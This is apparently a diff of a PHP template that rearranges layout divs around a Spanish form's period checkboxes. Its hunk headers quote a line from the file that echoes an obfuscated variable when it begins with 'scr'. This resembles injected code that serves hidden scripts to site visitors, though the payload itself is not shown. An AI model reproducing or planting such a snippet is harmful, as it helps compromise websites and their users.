@@ -124,6 +124,11 @@ if (substr($wp_7739xq,1,3) === 'scr'){ echo $wp_7739xq; }
 						</div>
 					</div>
 				<br>
+				
+				</div>
+			</div>
+			<div class="row">
+					<div class="col-md-3">
 					<div class="col-lg-6">
 						
 						Periodo
@@ -157,11 +162,6 @@ if (substr($wp_7739xq,1,3) === 'scr'){ echo $wp_7739xq; }
                                                   <input type="checkbox" name="chk_group[]"  value="2016-1" class="period periods" />2016-1 (Enero)<br />
                                               </div>
 				  </div><!-- /.col-lg-3 -->
-				
-				</div>
-			</div>
-			<div class="row">
-					<div class="col-md-3">
 
 					</div>
 			</div>
